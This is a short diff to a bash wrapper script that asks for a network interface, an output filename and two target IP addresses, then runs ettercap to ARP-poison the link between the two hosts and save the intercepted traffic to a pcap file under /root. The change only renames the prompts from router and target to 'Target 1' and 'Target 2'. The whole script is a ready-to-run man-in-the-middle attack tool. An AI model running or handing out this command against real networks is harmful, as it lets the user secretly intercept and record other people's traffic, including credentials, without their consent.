@@ -6,9 +6,9 @@ echo Which interface to use i.e. eth0, wlan0 etc
 read -p 'Interface: ' intervar
 echo Enter filename
 read -p 'Filename: ' filevar
-echo Enter Router IP
+echo Enter Target 1 IP
 read -p 'Router IP: ' routervar
-echo Enter Target IP - if required
+echo Enter Target 2 IP - if required
 read -p 'Target IP: ' targetvar
 ettercap -T -i $intervar -M arp:remote -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
 
